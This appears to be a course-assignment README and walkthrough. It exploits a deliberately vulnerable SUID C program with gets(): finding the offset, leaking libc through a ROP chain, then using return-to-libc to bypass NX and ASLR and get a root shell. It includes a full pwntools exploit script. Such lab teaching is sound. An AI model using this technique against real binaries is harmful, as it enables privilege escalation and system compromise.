# Damn vulnerable app
Welcome!!!

This a vulnerable application written in 'c.'

In this tutorial I will show you how to bypass these two security controls on a linux operating system using the return-to-libc attack:
- NX: non-executable stack
- ASLR: Address Space Layout Randomization

# Dependencies
Below are a list of dependencies that are required in order to complete the exploitation:

**Exploit compiled and performed on >> cat /etc/os-release #output: Linux 5.10.0-kali9-amd64 SMP Debian 5.10.46-1kali1 (2021-06-25) x86_64 GNU/Linux Version: 2021.2** 


### install git
```sh
sudo apt-get install git
```
### update and install pwntools
```sh
sudo apt-get update
sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
```

> **Note**: Do not install pwntools using root account!!!!

```sh
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```
### install  gdp-peda
```sh
sudo apt-get install gdb
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
```

> **Note**: Sometimes the clipboard will have issues in linux and this program will help clear it out. Install if required.


```sh
sudo apt-get install xsel
xsel -cb    #to clear clip-board
```
# Compiling

### Clone code from:
```sh
sudo apt-get install git
```

In your target directory:
```sh
git clone https://github.com/ZEIT8042/assign2.git
```
### Compile vulnerable program
```sh
make                    //execute as root
```
#or
```sh
gcc -fno-stack-protector -no-pie vuln64.c -o vuln64
sudo chown root:root vuln64
sudo chmod u+s vuln64
```

## Execution

[See here for a video demonstration of the walkthrough](https://unsw-my.sharepoint.com/:v:/g/personal/z5332187_ad_unsw_edu_au/EaEiUkzgTYJEn1G7LY-x2QIBVWzUD1xK5wFEphhhcw3iXw?e=sZJcY7)

This program is sucseptible to a Buffer overflow (BoF) attack when the helpCommand() c function is called after the "Enter to continue...." prompt which allows user input to be placed direclty into into the buffer[] using the gets(buffer) command. The gets() function does not perform any bounds checking which allows for the stack to be overwritten. 

Security Controls bypass include non-executable stack (NX) and Address space layout randomization (ASLR). The NX-bit is a security control implemented  on modern CPU architectures used to mark certain areas of stack memory as "non-exectable" and is a common feature which mitigates attackers from placing malicious shellcode within a program's memory and executing. ASLR further enhances BoF protection by randomizing the address space of stack positions within the executable and libraries which makes attacks against the program less reliable.
#### Objectives
In this turtorial we will perform the following objectives:
1. overflow the programs buffer to gain control of the RSI register (x64)--> Find the offset
2. Execute a memory leak vulnerability within the puts() call using a ROP chain. 
3. Bypass NX (non-executable) Bof prevention mechanism by using the return-to-libc subroutine - using memory leak to find libc base address we will then bypass ASLR
4. Gain root shell, suprisingliy not through SUID

#### Method: 
1. Use gdb-peda to discover buffer offset address
2. Create ROP chain to puts() call and leak memory address using python3 pwntools
3. Calculate libc base address using memory leak and create another ROP chain to execute "/bin/sh" function. (NX and ASLR bypass)
4. Gain root shell by integrating setuid() function

# Exploit - Walkthrough
## Find the offset

Open up gdb peda and create a pattern string which will be used to discover the offset of our BoF.	

```sh
┌──(student㉿kali)-[~/Desktop/assign2/app]
└─$ gdb vuln64
GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln64...
(No debugging symbols found in vuln64)
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```



Run the program using the 'h' as an argument switch. Copy the patter string into the vulnerable help function and hit enter. We will immediately see a SIGSEGV segmentation fault which indicates that the program has attempted to write outside of its allocated memory. 

```sh
gdb-peda$ r h
Starting program: /home/student/Desktop/assign2/app/vuln64 h
This is an admin tools to run programs with elevated privileges
Press Enter to return...
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7ffc7b841f20 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBX: 0x0 
RCX: 0x7f42fb26d980 --> 0xfbad2288 
RDX: 0x0 
RSI: 0x1e536b1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
RDI: 0x7f42fb270680 --> 0x0 
RBP: 0x4147414131414162 ('bAA1AAGA')
RSP: 0x7ffc7b841f58 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x4012a6 (<helpCommand+55>:        ret)
R8 : 0x7ffc7b841f20 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
R9 : 0x0 
R10: 0x6e ('n')
R11: 0x246 
R12: 0x4010a0 (<_start>:        xor    ebp,ebp)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]

```


Use the in-built peda pattern_search command to calculate the offset number, of which we determine that the offset to this vulnerable function is '56'

```sh
gdb-peda$ pattern_search
Registers contain pattern buffer:
RBP+0 found at offset: 48
Registers point to pattern buffer:
[RAX] --> offset 0 - size ~100
[RSI] --> offset 1 - size ~101
[RSP] --> offset 56 - size ~44
[R8] --> offset 0 - size ~100
```

To confirm the offset, open another terminal, run a small python command and execute the vuln64 program again. Place the string into the prompt to overflow the buffer

```sh
┌──(student㉿kali)-[~/Desktop/assign2/app]
└─$ python -c 'print "A"*56 + "BBBB"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
                                                                                                              
┌──(student㉿kali)-[~/Desktop/assign2/app]
└─$ ./vuln64 h
This is an admin tools to run programs with elevated privileges
Press Enter to return...
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
zsh: segmentation fault  ./vuln64 h

```

Execute the below command to verify the cause of the segfault.

```sh
┌──(student㉿kali)-[~/Desktop/assign2/app]
└─$ sudo dmesg | grep -i segfault                                                                       139 ⨯
[sudo] password for student: 
[  297.389068] vuln64[1306]: segfault at 42424242 ip 0000000042424242 sp 00007ffc3f30c280 error 14 in libc-2.31.so[7f638cded000+25000]

```

Returning to gdb, we perform the same and see that the RSI register is filled with BBBB, which indicates we have control over the execution flow of the program. 

> **Note** :The RIP register on x86-64 is a special purpose register that holds the memory address of the next executable instruction.

```sh
gdb-peda$ r h
Starting program: /home/student/Desktop/assign2/app/vuln64 h
This is an admin tools to run programs with elevated privileges
Press Enter to return...
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7ffc9187ddb0 ('A' <repeats 56 times>, "BBBB")
RBX: 0x0 
RCX: 0x7f6824ad5980 --> 0xfbad2288 
RDX: 0x0 
RSI: 0x7996b1 ('A' <repeats 55 times>, "BBBB\n")
RDI: 0x7f6824ad8680 --> 0x0 
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7ffc9187ddf0 --> 0x7ffc9187e048 --> 0x7ffc9187e409 ("/home/student/Desktop/assign2/app/vuln64")
RIP: 0x42424242 ('BBBB')
R8 : 0x7ffc9187ddb0 ('A' <repeats 56 times>, "BBBB")

```

## Create ROP chain to puts() call and leak memory address using python3 pwntools

Next, we will create our exploit and test to confirm that we can overflow the buffer.

```sh
from pwn import *


context.arch = 'amd64' # set runtime variables in a global setting.

#initialize process for pwntools
elf = ELF("../app/vuln64")
p = elf.process(["../app/vuln64" , "h"])

offset = 56

payload = [
	b"A" * offset,
	b"BBBB"

]

payload = b"".join(payload)
p.sendline(payload)
p.recvline()
p.recvline()

p.interactive()
```

Executing our script with Python3

```sh
┌──(student㉿kali)-[~/Desktop/assign2/exploit]
└─$ python3 exploit64.py
[*] '/home/student/Desktop/assign2/app/vuln64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/student/Desktop/assign2/app/vuln64': pid 1341
[*] Process '/home/student/Desktop/assign2/app/vuln64' stopped with exit code -11 (SIGSEGV) (pid 1341)
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$  

```

Confirming that our exploit is working as intended.

```sh
┌──(student㉿kali)-[~/Desktop/assign2/exploit]
└─$ sudo dmesg | grep -i segfault
[  297.389068] vuln64[1306]: segfault at 42424242 ip 0000000042424242 sp 00007ffc3f30c280 error 14 in libc-2.31.so[7f638cded000+25000]
[  543.306608] vuln64[1341]: segfault at 42424242 ip 0000000042424242 sp 00007ffffdc7c370 error 14 in libc-2.31.so[7fcd805fb000+25000]

```

Here we progress by testing the memory leak vulnerability within the puts() call. This is performed using a ROP chain and returning back to the helpCommand() function. As you can see, we successfully leaked 


```sh
┌──(student㉿kali)-[~/Desktop/assign2/exploit]
└─$ python3 exploit64.py
[*] '/home/student/Desktop/assign2/app/vuln64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/student/Desktop/assign2/app/vuln64': pid 1423
[*] Loaded 14 cached gadgets for '../app/vuln64'
[*] Switching to interactive mode
\xf0\xa5Y\x98\x80\x7f
This is an admin tools to run programs with elevated privileges
Press Enter to return...
$  
```

The below code achieves memory leak by using pwntool's ROP inbuilt functions to automatically grab the PLT and GOT address of the puts() function, whereby it is printed to the terminal \x00\x00\x00\x00\x00 etc... 

Pwntools is able to achieve this on execution by loading the gadgets of the program and creating a ROP object which can be called by using the below:

elf = ELF(./vuln64)

rop = ROP(elf)

rop.call()

This says “call PLT’s puts() function and print the leaked memory address of the GOT’s puts() function”. Remembering that these are dynamically linked between the program and libc.

```sh
rop.call(elf.plt['puts'], [elf.got['puts']]) 
```

Creating a ROP chain by calling the PLT and GOT gadgets of the puts() function and then returning to the beginning of the helpComand() function.

```sh
rop= ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']]) 		
rop.call(elf.sym['helpCommand'])			

offset = 56

payload = [
	b"A" * offset,
	rop.chain()

]
```

Here we go one step further by capturing the leaked address, storing it in our own variable and logging it to the console. We do this by using the rstrip() and ljust() modifiers to unpack the leaked 8 bytes into the 64-bit integer.


```sh
┌──(student㉿kali)-[~/Desktop/assign2/exploit]
└─$ python3 exploit64.py
[*] '/home/student/Desktop/assign2/app/vuln64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/student/Desktop/assign2/app/vuln64': pid 1429
[*] Loaded 14 cached gadgets for '../app/vuln64'
/home/student/Desktop/assign2/exploit/exploit64.py:29: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00")) #store & unpack output. Perform strip
[*] leaked puts@GLIBC found: 0x7f4a519f75f0
[*] Switching to interactive mode
This is an admin tools to run programs with elevated privileges
Press Enter to return...
$  

```

Code used to capture leaked address in terminal and convert from 8bytes to 64-bit

```sh
puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
log.info(f"leaked puts@GLIBC found: {hex(puts)}" )
```

## Bypass NX and ASLR

Now that we have the leaked address, we can determine the libc base address (remember that ASLR is changing the address every time the program is executed). By calculating the distance between the leaked GOT puts() address, we can determine the address of the system[] call; which is used to call our shell.

We construct another ROP chain, but this time calling the system() libc function which allows us to then call execute '\bin\sh.'

```sh
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")		
libc.address = puts - libc.symbols["puts"]		
log.info(f"libc base address: {hex(libc.address)}" )

binsh = next(libc.search(b"/bin/sh"))						
rop.call(libc.sym.system, [binsh])
rop.call(libc.sym.exit)
```

Executing our final exploit gives us a shell, however, even though that the vuln64 program has the SUID bit set, we cannot spawn another process of similar privileges due to linux security features where the 'real user ID' is different than the 'effective ID.' 

```sh
┌──(student㉿kali)-[~/Desktop/assign2/exploit]
└─$ python3 exploit64.py
[*] '/home/student/Desktop/assign2/app/vuln64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/student/Desktop/assign2/app/vuln64': pid 1447
[*] Loaded 14 cached gadgets for '../app/vuln64'
/home/student/Desktop/assign2/exploit/exploit64.py:29: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
[*] leaked puts@GLIBC found: 0x7fbb93a5a5f0
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc base address: 0x7fbb939e4000
[*] Switching to interactive mode
Press Enter to return...
𥥓\xbb\x7f
This is an admin tools to run programs with elevated privileges
Press Enter to return...
$ 
$ id
uid=1000(student) gid=1000(student) groups=1000(student),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),133(scanner),141(kaboxer)
$ whoami
student

```

## Gain root shell
To curcumvent this, we call the setuid() function before /bin/sh and set the UID to 0. Finally, we have the UID of 0 (root) when executing our exploit. 

```sh
This is an admin tools to run programs with elevated privileges
Press Enter to return...
$ id
$ whoami
root
$ id
uid=0(root) gid=1000(student) groups=1000(student),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),133(scanner),141(kaboxer)

```


## Exploit code provided:

```sh
from pwn import *


context.arch = 'amd64' # set runtime variables in a global setting.

#initialize process for pwntools
elf = ELF("../app/vuln64")
p = elf.process(["../app/vuln64" , "h"])

########################################Stage 1 Offset & Memory leak#######################################

#ROP chain using embedded pwn functions which uses files symbols at runtime to extract plt addresses.
rop= ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']]) 		#find puts in procedural link table, print mem address of GOT put
rop.call(elf.sym['helpCommand'])			#return to helpCommand function in program

offset = 56

payload = [
	b"A" * offset,
	rop.chain()

]

payload = b"".join(payload)
p.sendline(payload)
p.recvline()
p.recvline()
puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00")) #store & unpack output. Perform strip
log.info(f"leaked puts@GLIBC found: {hex(puts)}" )	#log output to determine success


############################################Stage 2 Ret2libc##############################################

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")		#specify libc //can be determined by: ldd vuln64 | grep libc
libc.address = puts - libc.symbols["puts"]		#load symbols from libc and perform plt, GOt offset to find base address
log.info(f"libc base address: {hex(libc.address)}" )

binsh = next(libc.search(b"/bin/sh"))			#find /bin/sh address //can use: strings -atx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
rop.call(libc.sym.setuid, [0])				#final ROP chain, call setuid 0 i.e. root, execute /bin/sh, exit gracefully
rop.call(libc.sym.system, [binsh])
rop.call(libc.sym.exit)

payload = [
	b"A" * offset,
	rop.chain()

]

payload = b"".join(payload)				#send payload
p.sendline(payload)
p.recvline()

p.interactive()
```
